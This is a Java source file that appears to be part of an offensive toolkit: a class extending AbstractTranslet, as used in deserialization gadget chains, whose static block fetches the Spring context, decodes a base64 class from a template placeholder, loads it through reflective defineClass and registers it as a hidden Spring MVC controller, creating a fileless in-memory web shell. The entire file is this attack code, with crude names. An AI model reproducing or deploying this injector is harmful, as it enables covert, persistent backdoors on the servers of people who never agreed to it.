import com.sun.org.apache.xalan.internal.xsltc.DOM;
import com.sun.org.apache.xalan.internal.xsltc.TransletException;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
import com.sun.org.apache.xml.internal.serializer.SerializationHandler;
import org.springframework.context.ConfigurableApplicationContext;
import org.springframework.web.context.request.RequestContextHolder;
import org.springframework.web.servlet.handler.AbstractHandlerMethodMapping;
import org.springframework.web.servlet.mvc.method.RequestMappingInfo;
import org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping;

import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import java.lang.reflect.Method;

public class SpringControllerShell extends AbstractTranslet {
    public SpringControllerShell() throws Exception{
        namesArray = new String[]{"fuck"};
    }

    static {
        try {
            ConfigurableApplicationContext context = (ConfigurableApplicationContext)RequestContextHolder.currentRequestAttributes().getAttribute("org.springframework.web.servlet.DispatcherServlet.CONTEXT", 0);
            RequestMappingHandlerMapping requestMappingHandlerMapping = (RequestMappingHandlerMapping)context.getBean("requestMappingHandlerMapping");

            Method registerHandlerMethod = AbstractHandlerMethodMapping.class.getDeclaredMethod("registerHandlerMethod",new Class[]{Object.class,Method.class,Object.class});
            registerHandlerMethod.setAccessible(true);

            Method getMappingForMethod = RequestMappingHandlerMapping.class.getDeclaredMethod("getMappingForMethod",new Class[]{Method.class,Class.class});
            getMappingForMethod.setAccessible(true);

            String className = "FuckController";
            String b64 = "%b64%";
            byte[] bytes = sun.misc.BASE64Decoder.class.newInstance().decodeBuffer(b64);
            ClassLoader classLoader = Thread.currentThread().getContextClassLoader();
            Method defineClass = ClassLoader.class.getDeclaredMethod("defineClass", String.class, byte[].class, int.class, int.class);
            defineClass.setAccessible(true);
            Class FuckController = (Class)defineClass.invoke(classLoader, className, bytes, 0, bytes.length);


            context.getBeanFactory().registerSingleton("fuckController",FuckController.newInstance());
            Method fuckMethod = FuckController.getMethod("fuck",new Class[]{HttpServletRequest.class,HttpServletResponse.class});

            RequestMappingInfo info = (RequestMappingInfo)getMappingForMethod.invoke(requestMappingHandlerMapping,new Object[]{fuckMethod,FuckController});

            registerHandlerMethod.invoke(requestMappingHandlerMapping,new Object[]{"fuckController",fuckMethod,info});
        }catch (Exception e){
            e.printStackTrace();
        }

    }

    @Override
    public void transform(DOM document, SerializationHandler[] handlers) throws TransletException {

    }

    @Override
    public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException {

    }
}
